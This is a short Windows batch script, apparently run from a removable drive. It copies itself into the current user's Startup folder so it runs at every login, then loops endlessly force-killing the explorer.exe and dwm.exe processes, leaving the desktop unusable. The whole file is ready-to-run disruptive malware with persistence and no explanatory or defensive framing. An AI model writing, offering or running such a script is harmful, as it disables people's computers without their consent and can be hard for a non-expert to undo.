@echo off
copy /y "E:\noexplorer.bat" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
:x
taskkill /F /IM explorer.exe /T > nul
taskkill /F /IM dwm.exe /T > nul
goto x